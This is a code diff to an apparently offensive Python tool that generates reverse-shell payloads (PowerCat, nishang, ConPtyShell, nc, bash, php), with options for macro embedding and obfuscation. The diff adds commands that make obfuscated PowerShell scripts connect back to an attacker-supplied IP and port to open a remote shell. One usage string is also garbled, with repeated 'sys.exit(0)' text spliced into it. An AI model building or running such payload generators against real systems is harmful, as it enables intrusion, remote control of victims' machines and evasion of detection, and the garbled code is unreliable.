@@ -225,7 +225,7 @@ def print_powercat(ip, port, use_macro, use_obfuscate):
 
 
     print("\n********** PowerCat payload **********\n")
-    payload = f"{ps1} -c {ip} -p {port} -e powershell"
+    payload = f"{file} -c {ip} -p {port} -e powershell"
     print(payload)
 
     print("\n********** PowerCat payload b64**********\n")
@@ -336,7 +336,7 @@ def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):
     print(f"\tpython3 -m uploadserver 80")
 
 
-def print_nishang(ip, port, use_macro):
+def print_nishang(ip, port, use_macro, use_obfuscate):
 
 
     file = "Invoke-PowerShellTcp.ps1"
@@ -491,7 +491,7 @@ def print_nc(ip, port):
 
 def shellpy_help():
     print("Shells")
-    print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
+    print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro] [--obfuscate]")
     print("\n\tShells types: \n\n\t\t-Powershell \n\t\t-nishang \n\t\t-conpty \n\t\t-powercat \n\t\t-perl \n\t\t-nc \n\t\t-bash \n\t\t-php")
     print(f"\t\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
     print("\n\tExamples:\n")
@@ -712,9 +712,19 @@ def pyfuscate(file, var, par, func, ip, port):
     shutil.copy(iFile, oFile)
 
     powercat_command = f"powercat -c {ip} -p {port} -e powershell"
+    nishang_command = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    conpty_command = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port}"
 
-    with open(oFile, "a") as file:
-        file.write("\n" + powercat_command)
+    if iFile == "powercat.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + powercat_command)
+    elif iFile == "Invoke-PowerShellTcp.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + nishang_command)
+    elif iFile == "Invoke-ConPtyShell.ps1":
+        with open(oFile, "a") as file:
+            file.write("\n" + conpty_command)
+
 
     obfuVAR     = dict()
     obfuPARMS   = dict()
@@ -796,7 +806,7 @@ def main(use_macro, use_obfuscate):
                 rows = int(sys.argv[4])
                 cols = int(sys.argv[5])
             except (IndexError, ValueError):
-                print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro] [--obfuscate] ")
+                print("Usage: shell <IP> <PORT> <SHELL_TYPE> [--macro] [--obfuscate] ")
                 print("[--macro] [--obfuscate] are only available with powershell, nishang conpty and powercat")
                 print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0ipowercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
                 sys.exit(1)
